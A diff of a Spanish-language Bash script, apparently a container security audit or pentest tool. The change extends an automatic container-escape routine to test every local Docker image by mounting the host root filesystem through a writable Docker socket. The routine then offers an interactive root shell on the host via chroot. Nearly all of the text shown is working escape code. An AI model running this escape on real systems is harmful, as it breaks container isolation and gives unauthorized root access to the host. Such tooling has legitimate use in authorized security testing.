@@ -1021,31 +1021,59 @@ echo ""
 
 # Intentar escape automático si estamos en contenedor y tenemos docker
 if [ $IN_CONTAINER -eq 1 ] && [ $DOCKER_SOCKET_WRITABLE -eq 1 ] && command -v docker &> /dev/null; then
-    echo -e "${RED}${BOLD}🚀 INTENTO AUTOMÁTICO DE ESCAPE DE CONTENEDOR${NC}"
+    echo -e "${RED}${BOLD}🚀 INTENTO AUTOMÁTICO DE ESCAPE DE CONTENEDOR - PROBANDO TODAS LAS IMÁGENES${NC}"
     echo ""
 
-    # Obtener la primera imagen disponible
-    ESCAPE_IMAGE=$(docker images --quiet 2>/dev/null | head -1)
+    # Obtener todas las imágenes disponibles
+    DOCKER_IMAGES_LIST=$(docker images --quiet 2>/dev/null)
 
-    if [ ! -z "$ESCAPE_IMAGE" ]; then
-        alert_critical "🔓 Intentando escape con: docker run -v /:/host/ $ESCAPE_IMAGE chroot /host/ bash"
+    if [ ! -z "$DOCKER_IMAGES_LIST" ]; then
+        WORKING_IMAGE=""
+        IMAGE_COUNT=$(echo "$DOCKER_IMAGES_LIST" | wc -l)
+        TESTED_COUNT=0
+        SUCCESS_COUNT=0
+
+        echo -e "${YELLOW}Encontradas $IMAGE_COUNT imágenes. Probando cada una...${NC}"
         echo ""
-        echo -e "${YELLOW}Ejecutando comando (timeout 3s)...${NC}"
+
+        # Iterar sobre cada imagen
+        while IFS= read -r ESCAPE_IMAGE; do
+            ((TESTED_COUNT++))
+            IMAGE_NAME=$(docker inspect --format='{{.RepoTags}}' "$ESCAPE_IMAGE" 2>/dev/null | head -1 || echo "$ESCAPE_IMAGE")
+
+            echo -ne "${BLUE}[$TESTED_COUNT/$IMAGE_COUNT]${NC} Probando: ${CYAN}$IMAGE_NAME${NC} ... "
+
+            # Intento de escape
+            ESCAPE_RESULT=$(timeout 2 docker run --rm -v /:/host/ "$ESCAPE_IMAGE" sh -c "id; pwd; echo 'ESCAPE_OK'" 2>&1 || echo "TIMEOUT_OR_ERROR")
+
+            if echo "$ESCAPE_RESULT" | grep -q "ESCAPE_OK"; then
+                echo -e "${GREEN}✅ ¡FUNCIONA!${NC}"
+                WORKING_IMAGE="$ESCAPE_IMAGE"
+                ((SUCCESS_COUNT++))
+                # Mostrar datos obtenidos
+                echo "$ESCAPE_RESULT" | sed 's/^/    /'
+                echo ""
+            else
+                echo -e "${RED}❌${NC}"
+            fi
+        done <<< "$DOCKER_IMAGES_LIST"
+
+        echo ""
+        echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+        echo -e "Resumen: $SUCCESS_COUNT de $IMAGE_COUNT imágenes pueden escapar"
+        echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
         echo ""
 
-        # Intento 1: Escape simple sin interactividad
-        ESCAPE_RESULT=$(timeout 3 docker run --rm -v /:/host/ "$ESCAPE_IMAGE" sh -c "id; pwd; cat /etc/hostname; echo 'ESCAPE_OK'" 2>&1 || echo "TIMEOUT_OR_ERROR")
-
-        if echo "$ESCAPE_RESULT" | grep -q "ESCAPE_OK"; then
-            alert_critical "✅ ESCAPE EXITOSO! Acceso obtenido al host"
-            echo "$ESCAPE_RESULT" | sed 's/^/  /'
+        if [ ! -z "$WORKING_IMAGE" ]; then
+            WORKING_IMAGE_NAME=$(docker inspect --format='{{.RepoTags}}' "$WORKING_IMAGE" 2>/dev/null | head -1 || echo "$WORKING_IMAGE")
+            alert_critical "✅ ESCAPE EXITOSO! Imagen ganadora: $WORKING_IMAGE_NAME"
+            echo ""
             ((CRITICAL++))
 
             # Ofrecer consola interactiva
-            echo ""
             echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
             echo -e "${YELLOW}¿Quieres una consola interactiva en el host? [S/n]${NC}"
-            echo -e "${CYAN}(Escribe 'S' para abrir bash en el host escaapdo)${NC}"
+            echo -e "${CYAN}(Usaré la imagen: $WORKING_IMAGE_NAME)${NC}"
             echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
             echo ""
 
@@ -1057,12 +1085,13 @@ if [ $IN_CONTAINER -eq 1 ] && [ $DOCKER_SOCKET_WRITABLE -eq 1 ] && command -v do
                 alert_critical "🚀 ABRIENDO CONSOLA INTERACTIVA EN HOST..."
                 echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                 echo -e "${GREEN}INGRESASTE AL HOST (FUERA DEL CONTENEDOR)${NC}"
+                echo -e "${GREEN}Imagen: $WORKING_IMAGE_NAME${NC}"
                 echo -e "${GREEN}Prompt: host# ${NC}"
                 echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                 echo ""
 
                 # Abrir shell interactiva escapada
-                docker run --rm -it -v /:/host/ "$ESCAPE_IMAGE" chroot /host/ bash 2>/dev/null || docker run --rm -it -v /:/host/ "$ESCAPE_IMAGE" chroot /host/ sh 2>/dev/null || true
+                docker run --rm -it -v /:/host/ "$WORKING_IMAGE" chroot /host/ bash 2>/dev/null || docker run --rm -it -v /:/host/ "$WORKING_IMAGE" chroot /host/ sh 2>/dev/null || true
 
                 echo ""
                 echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
@@ -1073,21 +1102,9 @@ if [ $IN_CONTAINER -eq 1 ] && [ $DOCKER_SOCKET_WRITABLE -eq 1 ] && command -v do
                 info "Consola interactiva cancelada"
                 echo ""
             fi
-
-        elif echo "$ESCAPE_RESULT" | grep -q "uid=0"; then
-            alert_high "⚠️  Ejecutado con uid=0 (root)"
-            echo "$ESCAPE_RESULT" | head -5 | sed 's/^/  /'
-            ((HIGH++))
-        elif echo "$ESCAPE_RESULT" | grep -q "TIMEOUT_OR_ERROR"; then
-            alert_medium "⏱️  Escape timeout o error - posible restricción"
-            info "Puede necesitar privilegios elevados o socket no accesible"
         else
-            if [ ! -z "$ESCAPE_RESULT" ] && [ "$ESCAPE_RESULT" != "TIMEOUT_OR_ERROR" ]; then
-                alert_medium "Respuesta recibida:"
-                echo "$ESCAPE_RESULT" | head -5 | sed 's/^/  /'
-            else
-                info "Sin respuesta del escape (posible restricción)"
-            fi
+            alert_high "⚠️  Ninguna imagen pudo escapar - Posible restricción de Docker"
+            echo ""
         fi
     else
         info "No Docker images available for escape attempt"
